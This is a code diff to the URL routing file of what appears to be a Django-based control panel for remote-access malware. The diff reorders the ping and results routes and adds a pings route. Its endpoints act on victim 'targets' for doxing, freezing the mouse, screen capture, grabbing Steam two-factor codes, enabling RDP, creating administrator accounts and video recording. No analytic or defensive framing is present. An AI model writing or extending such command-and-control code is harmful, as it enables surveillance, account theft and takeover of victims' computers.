@@ -24,7 +24,10 @@ urlpatterns = [
     re_path(r'^api/target/(?P<target_uuid>\d+)/$', views.target),
     re_path(r'^api/ping/(?P<target_uuid>\d+)/$', views.ping),
     re_path(r'^api/targetmessagebyuuid/(?P<target_uuid>\d+)/$', views.get_target_message_id_by_uuid),
-
+    re_path(r'^api/ping/(?P<target_uuid>\d+)/$', views.ping),
+    re_path(r'^api/results/(?P<target_uuid>\d+)/$', views.get_target_results),
+    re_path(r'^api/pings/(?P<target_uuid>\d+)/$', views.get_target_pings),
+    
     re_path(r'^api/dox/(?P<target_uuid>\d+)/$', views.dox),
     re_path(r'^api/mouse/(?P<target_uuid>\d+)/(?P<freeze_time>\d+[smh])/$', views.mouse),
     re_path(r'^api/screen/(?P<target_uuid>\d+)/$', views.screen),
@@ -35,7 +38,5 @@ urlpatterns = [
     re_path(r'^api/getSteam2fa/(?P<target_uuid>\d+)/$', views.getSteam2fa),
     re_path(r'^api/rdp_enable/(?P<target_uuid>\d+)/$', views.rdp_enable),
     re_path(r'^api/create_admin_user/(?P<target_uuid>\d+)/$', views.create_admin_user),
-    re_path(r'^api/ping/(?P<target_uuid>\d+)/$', views.ping),
-    re_path(r'^api/results/(?P<target_uuid>\d+)/$', views.get_target_results),
     re_path(r'^api/videorecord/(?P<target_uuid>\d+)/(?P<record_time>\d+[smh])/$', views.video_record),
 ]
